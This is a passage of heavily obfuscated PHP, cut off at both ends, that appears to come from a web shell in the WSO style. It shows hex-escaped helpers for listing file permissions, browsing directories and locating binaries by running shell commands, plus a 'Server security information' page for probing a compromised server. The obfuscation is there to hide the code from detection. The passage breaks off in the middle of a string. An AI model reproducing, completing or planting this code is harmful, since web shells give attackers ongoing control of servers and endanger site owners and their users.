73\x6c"]}." \x42";}function perms($p){$orfhfs="\x69";$egveonqeykn="\x70";$vfgwdkm="\x69";${"\x47\x4c\x4f\x42ALS"}["\x74\x78\x62\x74\x76\x69\x62\x6b\x74k"]="\x70";${"\x47\x4c\x4fBA\x4c\x53"}["\x6e\x65\x68\x74\x76cc\x61\x6e\x66"]="\x69";$finabjbjvi="p";${"G\x4c\x4f\x42\x41\x4c\x53"}["\x78\x67ii\x73\x6cock\x72"]="\x70";$ydteblm="\x70";${"GLOB\x41LS"}["\x69\x78\x6d\x79\x6b\x71\x71\x75\x6fvr"]="\x69";${"\x47\x4c\x4fB\x41L\x53"}["ofd\x61s\x75\x65\x77j\x63"]="\x69";$cfjkuxltyjx="\x69";$yocqweobx="\x70";$egbwsrwd="i";${"GLO\x42A\x4cS"}["\x77fq\x74c\x63\x62nb"]="\x70";${"\x47\x4c\x4f\x42\x41L\x53"}["p\x6a\x74c\x6a\x65\x6c\x76\x73\x6ak"]="\x70";${"GL\x4f\x42A\x4cS"}["\x68jibjlr\x66y\x77"]="\x70";${"\x47L\x4fBA\x4cS"}["\x65q\x62\x76\x6fm\x6e"]="\x69";${"\x47\x4c\x4f\x42\x41\x4cS"}["f\x71\x76\x63rz\x79\x73"]="\x69";if((${${"\x47L\x4fB\x41\x4c\x53"}["\x61\x69\x68\x74j\x77\x64\x62\x79\x63\x62\x6d"]}&0xC000)==0xC000)${${"\x47\x4c\x4f\x42\x41L\x53"}["\x77\x73e\x66xa\x6em"]}="\x73";elseif((${${"GLO\x42AL\x53"}["t\x78b\x74\x76\x69\x62kt\x6b"]}&0xA000)==0xA000)${${"\x47\x4c\x4f\x42\x41\x4cS"}["wse\x66\x78a\x6e\x6d"]}="l";elseif((${${"G\x4cO\x42\x41\x4c\x53"}["xg\x69\x69\x73\x6cockr"]}&0x8000)==0x8000)${$orfhfs}="-";elseif((${${"\x47L\x4f\x42\x41\x4c\x53"}["\x61i\x68\x74j\x77\x64\x62y\x63\x62\x6d"]}&0x6000)==0x6000)${${"\x47L\x4fBA\x4c\x53"}["\x77s\x65\x66\x78\x61\x6e\x6d"]}="\x62";elseif((${$ydteblm}&0x4000)==0x4000)${${"\x47LO\x42A\x4c\x53"}["\x6f\x66d\x61sue\x77\x6a\x63"]}="\x64";elseif((${${"G\x4c\x4f\x42\x41\x4cS"}["a\x69\x68t\x6aw\x64\x62y\x63b\x6d"]}&0x2000)==0x2000)${${"\x47L\x4f\x42A\x4c\x53"}["w\x73\x65f\x78\x61n\x6d"]}="c";elseif((${${"\x47L\x4f\x42\x41L\x53"}["\x61\x69\x68\x74j\x77\x64\x62yc\x62\x6d"]}&0x1000)==0x1000)${${"G\x4c\x4f\x42\x41\x4cS"}["i\x78\x6d\x79\x6b\x71\x71\x75\x6f\x76r"]}="p";else${$vfgwdkm}="u";$fuyjtenh="\x70";${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x77\x73e\x66\x78\x61n\x6d"]}.=((${$finabjbjvi}&0x0100)?"r":"-");${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x77\x73\x65f\x78\x61\x6e\x6d"]}.=((${${"GL\x4f\x42\x41\x4c\x53"}["ai\x68\x74\x6a\x77\x64\x62\x79cb\x6d"]}&0x0080)?"\x77":"-");${"G\x4c\x4fB\x41LS"}["k\x65\x72bm\x65\x64q"]="p";${$egbwsrwd}.=((${${"\x47\x4c\x4fB\x41\x4cS"}["w\x66q\x74\x63c\x62\x6eb"]}&0x0040)?((${$fuyjtenh}&0x0800)?"s":"x"):((${${"\x47L\x4fB\x41LS"}["\x61\x69\x68\x74\x6a\x77\x64byc\x62\x6d"]}&0x0800)?"S":"-"));${${"G\x4cO\x42\x41\x4c\x53"}["\x77\x73e\x66\x78an\x6d"]}.=((${${"\x47L\x4f\x42A\x4c\x53"}["pj\x74\x63\x6a\x65\x6c\x76\x73\x6a\x6b"]}&0x0020)?"\x72":"-");${$cfjkuxltyjx}.=((${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6b\x65r\x62\x6d\x65\x64\x71"]}&0x0010)?"w":"-");${${"\x47\x4cOBAL\x53"}["w\x73\x65\x66\x78an\x6d"]}.=((${$yocqweobx}&0x0008)?((${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x68j\x69\x62\x6a\x6c\x72\x66\x79w"]}&0x0400)?"\x73":"\x78"):((${${"G\x4c\x4f\x42\x41L\x53"}["aih\x74j\x77\x64\x62\x79cbm"]}&0x0400)?"S":"-"));${${"G\x4c\x4fBA\x4c\x53"}["\x65\x71\x62\x76o\x6dn"]}.=((${$egveonqeykn}&0x0004)?"\x72":"-");${${"GL\x4f\x42ALS"}["\x77se\x66x\x61\x6e\x6d"]}.=((${${"G\x4cO\x42\x41L\x53"}["a\x69h\x74\x6a\x77d\x62y\x63\x62\x6d"]}&0x0002)?"w":"-");${${"\x47L\x4fBA\x4cS"}["\x66\x71\x76\x63\x72\x7ay\x73"]}.=((${${"\x47\x4cO\x42\x41L\x53"}["\x61\x69\x68\x74j\x77\x64\x62ycb\x6d"]}&0x0001)?((${${"\x47L\x4fB\x41\x4cS"}["\x61\x69\x68\x74\x6aw\x64\x62\x79\x63\x62m"]}&0x0200)?"\x74":"x"):((${${"\x47LOB\x41\x4c\x53"}["\x61i\x68t\x6a\x77d\x62\x79cb\x6d"]}&0x0200)?"\x54":"-"));return${${"G\x4c\x4f\x42A\x4c\x53"}["\x6eeh\x74\x76\x63c\x61\x6ef"]};}function viewPermsColor($f){$ybwwokoptroe="\x66";${"\x47\x4cOB\x41\x4cS"}["\x67\x79g\x6crd\x6cw\x6fq"]="\x66";$aitcgcdw="\x66";if(!@is_readable(${${"GL\x4f\x42AL\x53"}["\x72\x6c\x65\x6b\x74x\x6a\x74\x68\x74\x6a"]}))return"\x3c\x66\x6f\x6e\x74\x20c\x6fl\x6fr\x3d\x23FF0\x3000>\x3c\x62\x3e".perms(@fileperms(${$ybwwokoptroe}))."\x3c/b\x3e</\x66\x6f\x6e\x74>";elseif(!@is_writable(${${"\x47LO\x42\x41L\x53"}["gy\x67\x6c\x72\x64\x6c\x77\x6fq"]}))return"\x3c\x66\x6f\x6e\x74 \x63\x6fl\x6f\x72\x3d\x77hite\x3e<b\x3e".perms(@fileperms(${${"G\x4c\x4fB\x41L\x53"}["\x72\x6c\x65\x6b\x74\x78j\x74\x68\x74j"]}))."\x3c/b\x3e</font>";else return"\x3c\x66\x6f\x6et co\x6co\x72=#00A\x38\x418><\x62>".perms(@fileperms(${$aitcgcdw}))."\x3c/b\x3e\x3c/\x66\x6fnt\x3e";}if(!function_exists("\x73ca\x6e\x64i\x72")){function scandir($dir){${${"\x47L\x4f\x42\x41\x4c\x53"}["\x76\x75\x77\x63p\x6bl"]}=opendir(${${"G\x4cO\x42\x41\x4cS"}["\x76\x74\x6e\x6e\x75h\x70"]});${"\x47\x4c\x4f\x42\x41L\x53"}["\x70o\x6dd\x73x\x77\x70m\x66v"]="\x64\x68";$jcpcenemjoy="\x66\x69\x6c\x65\x73";${"G\x4cO\x42ALS"}["i\x6b\x79\x6auyr\x73"]="fi\x6c\x65n\x61m\x65";while(false!==(${${"\x47\x4cO\x42A\x4c\x53"}["\x69\x6b\x79\x6a\x75\x79r\x73"]}=readdir(${${"\x47\x4c\x4fBAL\x53"}["p\x6f\x6d\x64s\x78\x77\x70\x6d\x66v"]}))){${${"\x47\x4c\x4f\x42A\x4cS"}["e\x6c\x78\x70\x68\x78\x71\x65"]}[]=${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x65\x7a\x6e\x74i\x79\x65l\x6a\x70e\x72"]};}return${$jcpcenemjoy};}}function which($p){${${"G\x4c\x4f\x42A\x4cS"}["\x68\x78\x6bl\x64\x61\x6b\x77qr"]}=ex("whi\x63\x68 ".${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x61\x69\x68tjw\x64\x62\x79\x63\x62\x6d"]});if(!empty(${${"G\x4c\x4f\x42\x41LS"}["\x68x\x6b\x6cd\x61k\x77\x71r"]}))return${${"G\x4c\x4f\x42A\x4cS"}["\x68\x78\x6b\x6c\x64\x61k\x77q\x72"]};return false;}function actionSecInfo(){printHeader();echo"\x3ch\x31>S\x65\x72\x76\x65\x72 se\x63ur\x69t\x79 i\x6e\x66o\x72m\x61\x74\x69on\x3c/h1>\x3c\x64i\x76\x20c\x6ca\x73s=\x63onte\x6et\x3e";function showSecParam($n,$v){$hrmdrnrw="\x76";${${"GL\x4fB\x41\x4c\x53"}["\x6f\x64\x77\x6fy\x74\x6a\x69"]}=trim(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x6f\x64\x77\x6f\x79t\x6ai"]});if(${$hrmdrnrw}){$kwxouaancm="\x76";${"\x47\x4cOB\x41L\x53"}["w\x62c\x6c\x65\x69r"]="\x76";echo"<\x73\x70\x61n>".${${"\x47\x4c\x4fBALS"}["\x62\x70\x79\x64\x75\x71\x64\x64\x6fpn"]}.": </spa\x6e\x3e";if(strpos(${${"\x47\x4c\x4f\x42AL\x53"}["w\x62c\x6c\x65\x69\x72"]},"\n")===false)echo${$kwxouaancm}."\x3cb\x72\x3e";else echo"\x3cp\x72e\x20c\x6cas\x73\x3dml1\x